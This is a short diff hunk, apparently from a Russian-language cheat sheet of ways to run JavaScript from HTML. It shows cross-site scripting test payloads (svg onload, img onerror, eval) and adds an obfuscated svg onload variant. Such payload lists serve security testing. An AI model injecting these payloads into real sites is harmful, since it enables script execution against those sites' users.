@@ -21,6 +21,9 @@ eval('alert(9)')
 "><svg onload=alert(1)>
 <svg/onload=alert()>
 <img src onerror=alert(0)>
+
+
+<svg/onload=%26nbsp;alert`loool`+
 ```
 ---
 Основные методы вызова js из html
